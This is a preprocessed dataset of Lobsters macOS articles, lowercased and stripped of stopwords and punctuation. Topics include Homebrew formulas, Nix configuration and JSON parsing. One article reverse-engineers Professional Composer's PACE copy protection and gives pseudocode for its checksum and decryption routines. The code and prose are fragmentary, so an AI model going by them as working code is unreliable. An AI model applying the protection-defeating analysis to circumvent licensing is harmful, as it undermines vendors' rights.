seccodecheckvaliditywitherrors seems communicate yet another process find take around m per location delay privileged location accessed result cached cache last next relaunch application reproduce opened transmission went preference transfer configure different folder shown popup button name icon configured desktop document downloads relaunching transmission opening preference system resulted second delay quite noticeable relevant part stack delay nsworkspace iconforfile getattrlist waitingonapprovalfromsandboxd issue reported apple assigned keychain access like privileged folder keychain item also require permission application access something wrong specifically calling seckeychainfindgenericpassword cause noticeable delay bad internet day call stall second system integrity protection disabled however disabling internet removed delay internet enabled reproducible relaunching application triggering code called seckeychainfindgenericpassword issue reported apple assigned apple responded application use function though documentation seckeychainfindgenericpassword state deprecated even still cause multisecond delay application already granted access keychain item request item creating instance abaddressbook take average second system take second like keychain access problem entirely removed disabling internet disabling sip issue reported apple assigned application launch delay worst issue sometimes thing stall second mostly though launching application sampling application launch show stall imageloadermacho loadcodesignature slsmainconnectionid many reference skylight cgs stack trace delay removed disabling internet unfortunately fixed disabling sip issue reported apple assigned final word issue experienced new mac mini o intentionally kept close possibly factory default got confirmation friend ran test machine although timing different mine showed significant delay operation identified writing post call attention consider serious design problem apple recent o appears lowlevel system api exec getxattr synchronous network activity returning caller sip enabled bad internet day entire machine freeze second every minute mention everything sluggish update system freezing posted comment michael tsai blog hypothesis u suffer system freeze addition internet connectivity also depends many new process spawned people running make similar tool probably getting close system limit many capability request process assuming new process require capability check
69,Lobsters,mac,Apple macOS,Building the FusionAuth Homebrew Formula (2019),https://fusionauth.io/blog/2019/04/18/building-fusionauth-homebrew-formula,building fusionauth homebrew formula,installing via brew setup wizard detailed documentation stackoverflow github built homebrew formula http githubcomfusionauthhomebrewfusionauthtreemasterformula code terminology brew formula brew bottle brew cask brew tap formula part extending formula install http githubcomhomebrewbrewblobmasterdocsformulacookbookmd variablesfordirectorylocations post install caveat plist additional detail summary,want install fusionauth want use homebrew instead docker using boring zip file problem goal fastest easiest authentication platform deploy wherever whenever want homebrew formula get running minute post show work provide detail pulled together installing via brew tl dr want get fusionauth running interested need pretty simple brew tap fusionauthfusionauth brew install fusionauthapp fusionauthsearch run following start brew service start fusionauthsearch brew service start fusionauthapp fast simple dive start using api first time need go setup wizard good create user application role specific detail read detailed documentation let u know question stackoverflow github see whole process action second video try blink browser support video tag built homebrew formula get detail check homebrew formula github http githubcomfusionauthhomebrewfusionauthtreemasterformula building homebrew formula fusionauth pretty straightforward homebrew formula already support downloading zip start build put normal download url formula url generate hash added security next step unpacking zip format brew could use effectively putting persistent thing either var etc normal install using fast path installer script result piece laid top directory everything required brew every piece must get directory easy cleanup separation resolve item mapped following directory original directory new location config etcfusionauth log varlogfusionauth java varfusionauthjava data varfusionauthdata used fusionauthsearch package finally found brew trying move dynamic library dylib file found inside package common location brew pretty aggressive moving dylibs standard location even though already portable binary spitting nasty looking error anyone installed formula want see solve problem modified homebrew formula tar dylibs elasticsearch package install phase extract back post install phase ensured brew stopped spitting nasty error message one note seems homebrew differentiate library formula meant linked dynamically loaded binary used internally program good forum thread stackoverflow question would great homebrew allowed formula designer specify configuration file dylibs ignore development able test using following command allowed test formula locally without constantly iterating github command handy allows avoid cycle push test debug repeat brew install debug v formulafusionauth app rb working though minor issue ended solid homebrew formula make simple install manage fusionauth file hope work well let know question issue code included code used create formula every piece terminology homebrew terminology helpful understand coding brew formula ruby script contains wellknown method field getting anything installed brew bottle snapshot formula final state laid quickly easily without actual install step exception post install step think bottle prebuilt formula similar deb package v build source ie formula brew cask macos application usually defined app extension entirely self contained cask used application simple formula installing something already macos app think adobe photoshop macos desktop application brew tap source getting formula default shorthand org tap equates github repo org homebrew tap folder inside called formula contains number ruby file installable formula rough equivalent would ppa apt repo formula part next section break part forumula detail better understand build extending formula basic state formula contains meta data description homepage download url url also associated hash added security formula start class fusionauthapp formula desc fusionauth app homepage http fusionauthio url http def install install stuff end def postinstall noop end end install homebrew installing fusionauth formula downloads ruby script store locally well known location executes ruby script determine download file using url field class url file downloaded homebrew extract file usually zip temporary directory next executes install function ruby class working directory temporary directory homebrew extracted zip also known buildpath homebrew provides bunch variable define package installed ruby script use variable install everything correct location documentation page list homebrew variable http githubcomhomebrewbrewblobmasterdocsformulacookbookmd variablesfordirectorylocations case fusionauth ship ready go need move thing prefix install bulk project directory prefix bunch symlinking brew directory done make sure file symlinked directory get persisted upgrade brew formula upgraded file deleted except one put etc var symlinking fusionauth startup script expect java log config specific directory relative fusionauth installation location worth noting default homebrew symlink script bin directory usrlocalbin prevent moving sbin instead install function fusionauthapp formula def install prefixinstall fusionauthapp etcinstall config fusionauth unless fileexists etc fusionauth prefixinstallsymlink etc fusionauth config var fusionauthjava mkpath unless fileexists var fusionauthjava prefixinstallsymlink var fusionauthjava var logfusionauth mkpath unless fileexists var logfusionauth prefixinstallsymlink var logfusionauth log end mentioned remove dylibs fusionauthsearch package avoid homebrew move different location install function fusionauthsearch formula code remove dylibs def install prefixinstall fusionauthsearch etcinstall config fusionauth unless fileexists etc fusionauth prefixinstallsymlink etc fusionauth config var logfusionauth mkpath unless fileexists var logfusionauth prefixinstallsymlink var logfusionauth log var fusionauthjava mkpath unless fileexists var fusionauthjava prefixinstallsymlink var fusionauthjava var fusionauthdata mkpath unless fileexists var fusionauthdata prefixinstallsymlink var fusionauthdata hide dylibs brew system tar cpf prefix fusionauthsearchelasticsearchmodulestar prefix fusionauthsearchelasticsearchmodules c prefix fusionauthsearchelasticsearch prefix fusionauthsearchelasticsearchmodules rmtree end post install install complete post install task like fusionauthapp special task post install mine empty postinstall fusionauthsearch hand requires replace dylibs removed installation order replace dylibs simply extracted tar file created install function postinstall function fusionauthsearch def postinstall fix dylibs brew leave alone system tar xpf prefix fusionauthsearchelasticsearchmodulestar c prefix fusionauthsearchelasticsearch rmf prefix fusionauthsearchelasticsearchmodulestar end caveat homebrew support function called caveat part ruby formula class function usually meant problem might exist due limitation homebrew incompatibility macos issue arise another use inform enduser location information package installed return value caveat function string displayed user install user executes brew info command caveat method fusionauthapp formula def caveat eos log var logfusionauthfusionauthapplog config etc fusionauthfusionauthproperties eos end cause brew print message install info caveat log usrlocalvarlogfusionauthfusionauthapplog config usrlocaletcfusionauthfusionauthproperties plist would like application run service need include plist well brew automatically installs plist file correct location define plist function formula similar caveat function return value plist function must string content file plist function fusionauthapp formula allows brew start fusionauth service def plist eos xml version encoding doctype plist public appledtd plist http plist version dict key keepalive key true key label key string plistname string key programarguments key array string sh string string catalinash string string run string array key runatload key true key workingdirectory key string prefix fusionauthappapachetomcatbin string key standardoutpath key string var logfusionauthfusionauthapplog string key standarderrorpath key string var logfusionauthfusionauthapplog string dict plist eos end brew installs plist file correct location use file launch daemon system macos launch service launch fusionauthapp service run command brew service start fusionauthapp additional detail want application bottled brew include field ruby formula class skipping bottling might good idea formula installs quickly contains prebuilt image already summary brew fantastic package manager macos hope enjoy fusionauth formula feel free rip code project enjoy brew
70,Lobsters,mac,Apple macOS,About the Finder... (2003),https://arstechnica.com/gadgets/2003/04/finder/,finder,introduction secret fundamental philosophical difference forum thread previous mac o x article,introduction secret nt like mac o x finder almost every article written mac o x included litany criticism small annoyance fundamental philosophical difference reader agree criticism disagree nt sure exactly problem even forum thread topic recently post thread represent broad range opinion many center network performance threading issue lot narrower personal concern believe mere existence thread others like indicative larger malaise surrounding mac o x finder past thought finder scattered throughout several article topic never given thorough treatment believe deserves article attempt rectify situation process try answer one common finderrelated question asked reader okay mister smartypants mac o x finder work going outline believe fairly conservative vision finder could explain make better current mac o x finder personally mac user must start defining term historically source controversy confusion surrounding topic previous mac o x article ar technica following mac o x since second developer release earlier article listed reversechronological order major public release bold
71,Lobsters,mac,Apple macOS,Building Native macOS Apps with ClojureScript,https://increasinglyfunctional.com/2020/05/13/native-macos-apps-clojurescript.html,building native macos apps clojurescript,microsoft diligent opensource work remember krell reactnativetcpsocket microsoft macosrn instruction krell reagent tutorial work window,thanks microsoft diligent opensource work build app macos modern lisp connected repl everything u remember truly dankest timeline dependency krell requires vanilla react native reactnativetcpsocket compiles fine macos building macos app requires mashing together microsoft macosrn instruction krell start creating new react native mac app npx reactnative init krellmacos version cd krellmacos npx reactnativemacosinit note need specify version react native microsoft fork caught far next follow krell reagent tutorial set clojurescript project add depsedn deps iovouchkrell giturl http githubcomvouchopensourcekrellgit sha iovouchreagentreactnative giturl http githubcomvouchopensourcereagentreactnativegit sha reagent mvnversion exclusion cljsjsreact cljsjsreactdom probably grab latest sha iovouchkrell one least correct deps add buildedn main krellmacoscore outputto targetmainjs outputdir target add clojurescript source file srckrellmacoscorecljs n krellmacoscore require reagentcore r reagentreactnative rn defn hello rnview style flex alignitems center justifycontent center rntext style fontsize hello krell macos defn export main args raselement hello run clj cljsmain installdeps install krell npm deps install native dependency cd macos pod install cd ready go clj krellmain co buildedn c r build clojurescript source start repl npx reactnative runmacos build project launch connect interact repl change source see hotreload work window microsoft react native fork support window actually ahead macos fork missing piece reactnativetcpsocket library native binding window built instruction work window well
72,Lobsters,mac,Apple macOS,Decomposing Professional Composer,https://blitter.net/blog/2020/05/10/decomposing-professional-composer/,decomposing professional composer,dad josh juran final revision composer mosaic despite advancement defeating diskdup kryoflux floppy emu email twitter short primer memory management launching application mac rvpr resource compiled pippin winter game programmer key official macsbug manual fkey fell diskbased system software foundation built resource life stage front line disassembly pace antipiracy legendary bold claim website,owe lot mark unicorn professional composer dad encountered program around subsequently adopted corresponding mac hardware two year later would grown mac possibly even computer certainly become familiar music notation software let alone music theory today dad tell origin story thusly graduate school became familiar notation program called professional program housed isu illinois state university computer lab run several macintosh computer always something visual learner came thing like found could navigate program rather easily without read manual began easy arrangement trumpet quartet early program ran floppy disk meant file big need another disk gave way hard drive even still limited big file many file drive remember asking upperlevel administration district bought hardware case mac plus would buy software program agreed rest pretty much history motu discontinued professional composer hereafter referred nickname proco courtesy friend fellow hacker josh juran sometime final revision released dad used program almost every day year convinced crossgrade motu composer mosaic latter offered better midi playback print layout capability plus could import time extensive library proco file however neither proco mosaic file fully imported modern music notation program therefore fell upon family computer continues even ensure hardware powering dad favorite music software continues run despite advancement matter course intimate knowledge capability requirement quirk two program lot sympathy bank government institution tasked similar mandate time proco came hard drive common proco application long since outgrown original home later boot disk shipped disk offering option install remove attached hard drive respectively launched master disk installing hard drive decrement install count master disk allowing user use one master disk install proco one hard drive time merely copying proco application hard drive enough application properly installed master disk launching program hard drive prompt user insert master disk already present remember accidentally wiping least one hard drive installation dad mac curious tinkerer youth dad pleased leading dad requestbeg motu one final backup master disk time testament quality floppy back along well dad take care disk remain usable year later hell hath fury like dad scorned eventually dad got mac could hack away expensive software least grew hacker programmer acquiring installing various software package authentication scheme going deep rabbit hole inner working mac o even dipping toe field software preservation music notation program started continued elude disk copy diskdup produce working substitute proco master disk difficult duplicate master disk using example kryoflux install proco emulated via floppy emu mounted disk copy disk image proco crash dark kick installer appear launched original master disk proco know properly installed determined finally find twenty year much long greeted proco minimal dialog displaying name software version copyright year credit mark unicorn inc therefore real idea wrote despite asked motu via email twitter source code multiple time year ultimately goal develop conversion utility brings proco file century even satisfied documentation file format would surprised anybody left motu even aware professional composer let alone familiar product supported quarter century disassembler go much advanced see short primer memory management launching application mac much mac software split chunk data code called resource swapped ram needed order maximize use sparse amount memory original macintosh designer traded tiny bit speed greater efficiency building memory manager asked load resource disk resource manager return handle loaded resource pointer oscontrolled master pointer pointing relocatable block within heap memory manager allowed move compact relocatable block heap even remove purge block available ram running low relief application management burden leveraged throughout mac system software addition allocating handle nonrelocatable block application may mark existing handle various attribute guide memory manager housekeeping example marking handle purgeable allows memory manager free associated block likewise locking handle prevents moved freed time doubleclick application launch finder carefully orchestrated sequence event take place finder call launch trap name application segment loader open resource fork file passed launch immediately preloads code resource id code specially formatted code resource contains parameter necessary set nonrelocatable block memory near top application memory space containing application quickdraw globals parameter passed finder application jump table following parameter jump table list tiny eightbyte routine load code resource segment jump offset within segment using parameter start code segment loader allocates space globals pivoting around register eventually passed application known mac programming parlance world unique running application jump table copied finder application parameter world code resource released first entry jump table executed application take control relative jump instruction original processor limited signed offset branch subroutine call limited offset either direction current program counter order accommodate program code memory constraint original macintosh segment loader invented manages application split code segment code within segment make intrasegment jump branch subroutine call subroutine needed outside particular segment call must made jump table turn load necessary segment new segment returned handle relocatable block like resource loaded memory manager automatically compact heap andor free purgeable handle make room ram recall jump table copied known location relative register application always easy access since new code segment created location application heap unknown compile time also mean code segment invoked assuming positionindependent code meaning branch subroutine call relative processor support branch absolute address utilitizing full usable width address bus later processor support larger relative branch offset segment necessarily limited around wellbehaved application check launch host mac necessarily capability exit early maximum compatibility application built compiler codewarrior generated table offset absolute branch instruction within code segment instruction compiled jump offset within segment relative crash mac executed stored small bit preflight code absolute branch fixed point within segment providing larger branch offset mac rvpr resource compiled pippin first thing notice proco jump table contains one valid entry lot nonsense likely sign encrypted jump temple apshai along winter game also us obfuscation trick scare casual hacker fact almost proco code resource look encrypted hope make sense proco file format looking code need derive algorithm decrypts rest movew push id code resource onto stack prior jumping via loadseg start allocating couple memory block use starting block memory call environment block stash stack pointer offset block push pointer environment block onto stack stash value scrdmpenb global offset environment block scrdmpenb short screen dump enable originally meant whether screen shot feature enabled via mac grew include fkeys well one popular thirdparty fkey available hacker programmer key drop installed debugger invoking eg providing way drop macsbug without physical programmer switch installed side machine functionality could simply writing equivalent fkey following instruction provided official macsbug manual motu certainly made easy wouldbe cracker conveniently drop debugger startup process precious software scrdmpenb set zero effectively disabling fkeys fkey apple lisa keyboard original macintosh keyboard keyboard later shipped mac feature know function key beyond key adorn top keyboard today device closely mimicked typewriter keyboard layout many user familiar time respective introduction apple reserved keyboard shortcut always available user controlreset break currently running program controlopen applereset reset computer example shortcut hardcoded rom easily modifiable user original mac since localization particular keyboard layout fell diskbased system software foundation built resource natural shortcut handled o modular way well apple made lack physical function key providing several virtual function key bound commandshiftnumbers invoked shortcut run tiny program stored fkey resource system file known fkeys programmer quickly discovered could write tiny fkey program install system file assigned otherwise unused number original set fkeys shipped follows eject firstinternal floppy disk present eject secondexternal floppy disk present take screenshot save disk take screenshot print first two ejecting fkeys went away introduction mac o x apple stopped shipping mac floppy drive though macos continues support external drive natively life assigned shortcut saving screenshots remaining holdover original system software allocate handle new locked context pop pointer environment block offset context push newlyallocated context handle onto stack next pas pointer top code resource executing recoverhandle get code resource handle store handle offset context store master pointer offset finally recover context handle stack passing first real stage stage front line disassembly stage fairly simple call three subroutine launching stage looking roughly like decompiled back pseudoc code initcontext context contextaggregatechecksum context context jumpto contextstageptrs jump stage let break function function start initcontext look like void initcontext ptr contextptr short contextptr stageptrs stageinfocmd getoffset nullptr contextptr contextptr stageglobalsptr contextptr stageptrs contextptr gethandlesize contextptr contextptr contextptr contextptr initcontext initializes block eight pointer result stageinfocmd look like enum stageinfocmdselector setoffset getoffset getoffsetsarray ptr stageinfocmd stageinfocmdselector selector ptr stageptr short index ptr codeptr static short offset offset stage top code offset stage top code ptr outptr nullptr switch selector case setoffset offset index short stageptr codeptr break case getoffset outptr codeptr offset index break case getoffsetsarray outptr offset break return outptr initcontext initializes block eight pointer context point eight different area code resource id first pointer point stage code currently executing second pointer point encrypted block code immediately following bit stage recognizable executable code eventually becomes stage code jump later interesting stageinfocmd ever called getoffset selector making rest function dead code next initialize field context used store aggregate computed checksum call look like long ptr contextptr contextptr latestchecksum calculatechecksum contextptr contextptr stageptrs pace contextptr aggregatechecksum calculatechecksum contextptr stageptrs contextptr pace contextptr latestchecksum return contextptr latestchecksum turn make couple call calculatechecksum passing call block leading following stage respectively long calculatechecksum ptr startptr ptr endptr long seed long size endptr startptr long cksum seed long sizeinlongs size sizeof long ptr ptr startptr sizeinlongs size sizeinlongs sizeof long long sizeinlongs cksum long ptr size long size cksum byte ptr return cksum one thing stick immediately use longword pace initial checksum seed pace likely reference pace antipiracy company founded still around today motu adopted pace protection code proco starting version released late indeed pirated version proco existed early still available internet unencrypted sharing much easier later version dad acquired mac plus proco combo summer june creation date september assuming motu shipped latest version new order follows earliest version dad owns motu periodically shipped new master disk containing updated version proco registered owner became available free practice commend got ta catch em checksum ready head decryption code take checksum code decrypted key make binary patching proco application involved process since remainder code would need reencrypted decryption new checksum succeed one thing sure protection designed resilient quickanddirty patch void ptr contextptr contextptr latestchecksum contextptr stageptrs contextptr void long key ptr startptr ptr endptr long size endptr startptr long sizeinlongs size sizeof long ptr ptr startptr sizeinlongs long longsleft sizeinlongs long rotcount key rotcount rotcount key rotateright key rotcount rorl long ptr key longsleft size sizeinlongs sizeof long size long bytesleft size long rotcount key rotcount rotcount key rotateright key rotcount rorl byte ptr byte key bytesleft stage fully decrypted jump right loading contextptr stageptrs jmping right nt hard still least another stage protection get hardly much closer decrypting remaining code resource jump table knowing pace reputation likely small victory ultimately long battle proco legendary mac circle copy protection heard true surely ride pace even make bold claim website know sound like unrealistic boast say anti piracy software cracked goal stay ahead curve hacking trend avoid giving known hook pattern recognize pepper anti piracy solution method know time consuming difficult impossible remove challenge accepted related
73,Lobsters,mac,Apple macOS,Managing Firefox on macOS with Nix,https://cmacr.ae/post/2020-05-09-managing-firefox-on-macos-with-nix/,managing firefox macos nix,defining package overlay tying extension nur repo nur expression repo fine grained configuration mimicking chrome profile duckduckgo changing appearance yabai xombrero vimium browserpass solarizedlight full configuration closing word twitter,post talk manage firefox mimick behavioursaesthetics come enjoy using browser year note way affiliated worldwide cool project site look great figured use screenshot last winter like many others experience chromechromium little sour time decided make jump firefox seeing browser one component system left declarative configuration thought good time tackle final piece defining package firefox package nixpkgs broken platformsdarwin quite nt set trying tackle simply nt time instead wrapped fetching release dmg simple overlay look like currently stdenv fetchurl undmg stdenvmkderivation rec pname firefox version buildinputs undmg sourceroot phase unpackphase installphase installphase mkdir p outapplications cp r firefoxapp outapplicationsfirefoxapp src fetchurl name firefox version dmg url http downloadinstallercdnmozillanetpubfirefoxreleases version macengbfirefox version dmg meta stdenvlib description firefox web browser homepage http wwwmozillaorgengbfirefox maintainer maintainerscmacrae platform platformsdarwin see simple derivation fetch unpacks dmg move application directory resulting using overlay simply add user system package list end nixprofileapplications application tying homemanager ever awesome ryceehomemanager really nice module configuring firefox overlay configured package simply setting programsfirefoxpackage firefox firefox name bound overlay module let much extension rycee nur repo programsfirefox module extension option programsfirefoxextensions list firefox addon package install note necessary manually enable extension inside firefox first installation type list package produce package derivation who result represents firefox extension add list installed fortunately rycee bunch available nur expression repo anyone unfamilar nur excerpt nixcommunitynur readme nix user repository nur communitydriven meta repository nix package provides access user repository contain package description nix expression allows install package referencing via attribute contrast nixpkgs package built source reviewed nixpkgs member rycee firefoxaddons package automatically generated updated declarative management extension nixpkgsconfigpackageoverrides pkgs nur import builtinsfetchtarball http githubcomnixcommunitynurarchivemastertargz inherit pkgs homemanageruserscmacraeprogramsfirefoxextensions pkgsnurreposryceefirefoxaddons ublockorigin browserpass vimium fine grained configuration mimicking chrome profile another great feature programsfirefox module homemanager configure user profile along setting available config stored userprefsjs excited see experience firefox profile management far lacklustre thought could perhaps cook something mimick profile management chrome extension firefox offer session management based profile really like simplistic approach instancewindow browser run profile session gotten used pattern work profile open one workspace personal profile open another managed achieve fairly elegantly think using homemanageruserscmacraeprogramsfirefoxprofiles let defaultsettings appupdateauto false browserstartuphomepage http lobster need splurge setting get idea identityfxaccountsaccountdevicename confignetworkinghostname signonremembersignons false home id setting defaultsettings browserurlbarplaceholdername duckduckgo toolkitlegacyuserprofilecustomizationsstylesheets true userchrome builtinsreadfile confduserchromecss work id setting defaultsettings browserstartuphomepage blank setting bunch common configuration like use profile leting defaultsettings profile merge operation unfamilar attribute right merged matching attribute left yield home profile styling get duckduckgo search engine work profile who differing setting default configuration blank home page nt taken time yet configure dead simple implement different styledcoloured work profile browser window differ appearance would nice launch different profile manner prefer following skhd binding cmd ctrl f open n nixprofileapplicationsfirefoxapp args p home cmd shift ctrl f open n nixprofileapplicationsfirefoxapp args p work firefox binary accepts p flag set profile pas using open args flag really nicely mimicks behaviour chrome mentioned browser data profile kept entirely separate changing appearance userchrome go along userprefsjs module also userchrome option recently decided take advantage using yabai managed configure desktop appearancefunctionality closely resemble tiling wms used linuxbsd year look like writing intentionally overcrowded sake demonstration used xombrero openbsd number year found longing somewhat similar appearance since configured alacritty patched emacs drop title bar fit nicely nature environment figured probably possible firefox via userchrome reader may noticed line earlier profile expression userchrome builtinsreadfile confduserchromecss decided break cs firefox file knew unwieldy managed conjure something hide element interested displaying operate browser mostly keyboard thanks vimium configures hide window control macos title bar hide clutter nav bar including extension except browserpass hide tab one tab open minimal appearance solarizedlight inspired theme move hamburger menu left url bar move tab inline right url bar full configuration anyone may want use tried keep clean well commented homemanager module also support usercontent yet play around closing word entire browsing environment declarative rest configuration nice able set new machine matter minute everything exactly like even intricacy concludes writeup question please nt hesitate comment reach twitter calumacrae next time happy hacking
74,Lobsters,mac,Apple macOS,Keeping Up Appearances: Non-native macOS Light/Dark Mode,https://cmacr.ae/post/2020-05-03-keeping-up-appearances-non-native-macos-light-dark-mode/,keeping appearance nonnative macos lightdark mode,look like solution already done nice logo launchd resulting manifest,like auto lightdark mode feature macos nice system change evening sun set le strain eye night hacking ahead spend time either terminal emacs nt really see much difference wondering could somehow invoke arbitrary command system changed way could run whatever need change light theme dark theme application turn two system behaviour exploit achieve running default read g appleinterfacestyle dark mode active return zero exit code nonzero exit code mode change system modifies librarypreferencesglobalpreferencesplist file got mode indicator event trigger strung together checking function filesystem event watcher look like solution actually spent couple day writing little service go would achieve fact large portion work already done spent time cleaning making reliable tool execute shell commandsscripts acompanying nix service module overlay even took oportunity draw nice logo sit nicely pimped badge laden readme ala project short lived someone immediately opened issue repo pointing rather using dedicated program watch event launchd actually watchpaths parameter take array string representing filesystem path change observed one path execution directive manifest evaluated although little disheartened couple day effort disipate mist uselessnes fact delighted really easy implement system configuration nix nix expression using achieve following launchduseragentsnighthook serviceconfig label aecmacrnighthook watchpaths homedir librarypreferencesglobalpreferencesplist environmentvariables path replacestrings home homedir configenvironmentsystempath programarguments pkgswriteshellscript nighthookaction default read g appleinterfacestyle devnull mode dark else mode light fi emacsswitchtheme pgrep q emacs mode dark emacsclient eval cmswitchtheme doomone elif mode light emacsclient eval cmswitchtheme doomsolarizedlight fi fi spacebarswitchtheme pgrep q spacebar mode dark spacebar config backgroundcolor spacebar config foregroundcolor elif mode light spacebar config backgroundcolor spacebar config foregroundcolor fi fi alacrittyswitchtheme diruserscmacraeconfigalacritty mode dark cp f diralacrittyyml dirliveyml elif mode light cp f dirlightyml dirliveyml fi yabaiswitchtheme mode dark yabai config activewindowbordercolor yabai config normalwindowbordercolor yabai config insertwindowbordercolor elif mode light yabai config activewindowbordercolor yabai config normalwindowbordercolor yabai config insertwindowbordercolor fi emacsswitchtheme spacebarswitchtheme alacrittyswitchtheme yabaiswitchtheme expression yield aecmacrnighthook launchd user agent service let go couple piece homedir simply convenience variable use throughout configuration result home directory path might let homedir builtinsgetenv home environmentvariablespath order able execute script launchagent using various binary installed system needed populate path variable easy enough simply use user shell path configenvironmentsystempath us home part value launchd manifest evaluated wo nt expand variable use builtinsreplacestrings interpolate homedir value replacestrings signature look like replacestrings replace replace string programarguments pkgswriteshellscript common convention launcd manifest use programarguments execution directive even simply calling single executable path argument value array string object wanted invoke script used pkgswriteshellscript function write script content place resulting script written nix store path interpolated inline string contained list resulting manifest using expression configuration produce librarylaunchagentsaecmacrnighthookplist look like xml version encoding doctype plist public apple computerdtd plist http plist version dict key environmentvariables key dict key path key string userscmacraenixprofilebin runcurrentsystemswbin nixvarnixprofilesdefaultbin usrlocalbin usrbin usrsbin bin sbin string dict key label key string aecmacrnighthook string key programarguments key array string string array key watchpaths key array string userscmacraelibrarypreferencesglobalpreferencesplist string array dict plist next time happy hacking
75,Lobsters,mac,Apple macOS,voxctl: Command-line tool for controlling the VOX music player,https://github.com/majjoha/voxctl,voxctl commandline tool controlling vox music player,vox vox javascript automation vox requirement installation usage license license,voxctl voxctl commandline tool controlling vox music player terminal hood work proxying call vox using javascript automation introduced mac o x yosemite voxctl currently support command vox scripting suite requirement installation brew tap majjohatap brew install voxctl usage usage voxctl command command start start vox quit quits vox play begin playback pause pause playback toggleplay toggle playback playing paused next skip next track playlist previous skip previous track playlist shuffle toggle shuffle playurl url play specified url addurl url add specified url playlist rewindforward rewinds current track forward rewindforwardfast rewinds current track forward fast rewindbackward rewinds current track backward rewindbackwardfast rewinds current track backward fast increasevolume increase volume decreasevolume decrease volume toggleplaylist showshides playlist info display information current track json isrunning print true vox open otherwise false help print information license see license
76,Lobsters,mac,Apple macOS,Apple to host virtual Worldwide Developers Conference beginning June 22,https://www.apple.com/newsroom/2020/05/apple-to-host-virtual-worldwide-developers-conference-beginning-june-22/,apple host virtual worldwide developer conference beginning june,apple developer app apple developer website,cupertino california apple today announced host annual worldwide developer conference virtually beginning june apple developer app apple developer website free developer company also announced swift student challenge opportunity student developer showcase love coding creating swift playground year opportunity million creative innovative developer around world get early access future io ipados macos tvos watchos learn apple engineer work build app experience enrich life apple customer around globe biggest yet bringing together global developer community million unprecedented way week june learn future apple platform said phil schiller apple senior vice president worldwide marketing wait meet online june global developer community share new tool working help create even incredible apps service look forward sharing detail everyone get closer exciting event student integral part apple developer community last year wwdc saw attendance student developer spanning different country said craig federighi apple senior vice president software engineering look forward although gathering virtual year want recognize celebrate creative contribution young developer around world wait see next generation innovative thinker turn idea reality swift student challenge swift playground revolutionary app ipad mac make learning swift programming language interactive fun pm pdt may student developer world submit swift student challenge creating interactive scene swift playground experienced within three minute winner receive exclusive jacket pin set information visit developer encouraged download apple developer app additional program information including keynote platform state union detail session lab schedule shared june information also made available apple developer website email app store country region world safest vibrant app marketplace half billion people visiting week best place user discover new apps allows developer size distribute apps customer around world app store feature many way developer build business since launch developer creating innovative apps influence culture change life apple revolutionized personal technology introduction macintosh today apple lead world innovation iphone ipad mac apple watch apple tv apple five software platform io ipados macos watchos tvos provide seamless experience across apple device empower people breakthrough service including app store apple music apple pay icloud apple employee dedicated making best product earth leaving world better found
77,Lobsters,mac,Apple macOS,Gadget Review: Perixx Trackball (PERIPRO-506) on Linux / Mac,https://shkspr.mobi/blog/2020/05/gadget-review-perixx-trackball-peripro-506-on-linux-mac/,gadget review perixx trackball linux mac,perixx buy replacement ball variety colour good bad linux generic chip manufacturer product listing buy trackball cost amazon,used trackball earnest since briefly rage school working home lockdown desk big enough accommodate fullsized keyboard mouse thought try trackballthis need unboxing video complicated setup tip inert black box red orb nestled itmade germany perixx heavy unit danger slipping around desk ball light enough control fingertip inertia whizz way around screen layout good pretty easy click thumb drag finger take little getting used toand yes look like hal like buy replacement ball variety coloursgoodclickable scrollwheel dead easy scroll mouse button always handymouse button large make satisfying clunk usedlong usb cabledetachable wrist rest kept good cushion right heightplug play driver required mac linuxit look gorgeous badsssslllloooowwww macos bumped mouse speed maximum still felt slowthe trackball slightly stiff begin reckon loosen timei really like able push ball click realise would impractical keep instinctivelythese pretty meagre complaintslinuxit worked top speed much faster macit show mosart semiconductor corp generic chip manufacturer product listing give much information c mon trackball getting firmware update buy itthis trackball cost amazon seems pretty reasonable
78,Lobsters,mac,Apple macOS,TaraHoleInIt/minivmac-3ds - Port of Mini vMac to the Nintendo 3DS,https://github.com/TaraHoleInIt/minivmac-3ds,port mini vmac nintendo,building http wwwgryphelcomcminivmacoptionshtml http wwwgryphelcomcminivmacdevelophtml supported option,building wrapper around main mini vmac source configuration tool contains option common port option passed passed mini vmac configuration tool see http wwwgryphelcomcminivmacoptionshtml http wwwgryphelcomcminivmacdevelophtml deletes generated makefile figured integrate part mini vmac build system actually build binary need use makefileplus macintosh plus makefileii macintosh ii based build supported option bit colour depth bit colour depth bit colour depth bit colour depth resolution resolution sound sound sample size many feel free experiment
79,Lobsters,mac,Apple macOS,"Faster JSON Support for iOS/macOS, Part 8: Dematerialize All the Things",https://blog.metaobject.com/2020/04/faster-json-support-for-iosmacos-part-8.html,faster json support iosmacos part dematerialize thing,object streaming streaming mpwobjectcache mpwobjectcache h available column store structure array soa holgi h h option standard object dl outlook note info metaobjectcom,last exciting instalment json parsing macosios series got rid temporary object parser builder protocol much possible saw performance soar mb almost time faster swift jsondecoder point creating object adding array take combined total surely something ca nt reasonably get rid object streaming although requirement object created nobody said exist time instead returning complete array parsed object done also tell parser stream object target come setting streamingthreshold say depth json tree start use streaming void decodempwdirectstream nsdata json mpwmasonparser parser mpwmasonparser alloc initwithclass testclass class mpwobjectbuilder builder mpwobjectbuilder parser builder builder builder settarget self parser parseddata json since set streaming target need provide writeobject method order conform streaming protocol void writeobject testclass anobject first first mpwrusage current objcount hicountanobjecthi method count object sum hi instance variable also record time first object come well m mb addition time first object around µs le millisecond application start receiving usable data able provide feedback user immediately noticeable begindictionary method longer top profile almost way bottom total running time actually possible still get million object still create even dole piecemeal fashion mpwobjectcache mpwobjectcache class h keep circular buffer object reinitialize reuse application code done described detail book mention book part pearson kindly made publicly available cache place actually instantiate number object needed fill cache safely recycle object cost function call object retained reused column store structure array another neat way interpreting dematerialization store data columnar data format structure array soa instead array structure aos organisation thanks holgi suggesting need specific builder mpwarraysbuilder h maintains set mutable array stored key receives value look appropriate array key add value array follows void writeinteger long number arraymap keystr mpwintarray aobjectforstringlength arraymap keystr keylen addinteger int number keystrnull void writestring id astring arraymap keystr nsmutablearray aobjectforstringlength arraymap keystr keylen addobject astring keystrnull integer value would mpwintarray h string regular nsmutablearray even better m mb option option example turn protocol connecting parser builder specifically created purpose actually extends streaming protocol handle disassembled hierarchy take tree pipe pipeline accurately reassemble end protocol used polymorphic write stream enable standard object shown dl earlier version presented macoun german outlook however probably hitting diminishing return point certainly proof concept certainly fat trim objcmsgsend impcache away going character input twice probably something could avoid apart performance improvement also minor detail correctness take care example handling json escape character key properly handling hierarchy thing particularly hard handled xml superclass require 